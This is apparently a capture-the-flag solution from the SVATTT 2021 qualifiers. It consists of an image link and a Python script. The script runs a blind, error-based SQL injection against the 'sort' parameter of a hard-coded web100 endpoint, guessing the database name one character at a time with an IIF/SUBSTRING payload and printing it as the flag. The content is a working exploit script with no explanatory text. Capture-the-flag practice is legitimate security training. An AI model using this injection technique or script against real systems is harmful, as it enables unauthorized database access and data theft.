![](https://github.com/magnetohvcs/ctf/blob/main/SVATTT2021/Quals/script_kiddie.png)
```
import requests,string, time

arr = string.ascii_letters+string.digits+string.punctuation

def bind(flag):
    for i in arr:
        res = requests.get(f'''http://167.172.85.253/web100/?sort=1|IIF(SUBSTRING(DB_NAME(),1,{len(flag)+1})='{flag+i}','B',2)''').text
        time.sleep(0.5)
        if 'Error' in res:
            return i
        if i=='#':
            return None    
    return None

def flag():
    flag = ''
    while 1:
        character = bind(flag)
        if character == None:
            return flag
        flag += character
        print('[+] flag = ',flag)


print("ASCIS{"+flag()+"}")
```
